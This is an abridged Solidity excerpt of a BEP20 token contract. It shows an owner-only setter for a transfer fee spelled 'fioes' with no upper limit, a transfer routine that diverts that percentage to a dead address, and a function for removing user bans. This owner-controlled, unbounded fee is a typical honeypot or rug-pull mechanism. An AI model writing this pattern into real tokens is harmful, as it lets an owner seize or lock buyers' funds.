...
contract Token is IBEP20, HasForeignAsset {
    ...
    function rmUserBun(address accdount) public onlyOwner {
    ...
    function setfioes(uint256 _value) external onlyOwner {
        _fioes = _value;
    }


    function getfioes() external onlyOwner returns(uint256){
        return _fioes;
    }
     ...
     * e.g. implement automatic token fioess, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
    ...
    function _transfer(
        ...
        uint256 fioesAmount = 0;
        fioesAmount = amount.mul(_fioes).div(100);
        uint256 amoun;
        amoun = amount - fioesAmount;
        ...
        if (fioesAmount > 0) {
            emit Transfer(sender, _DEADaddress, fioesAmount);
        }
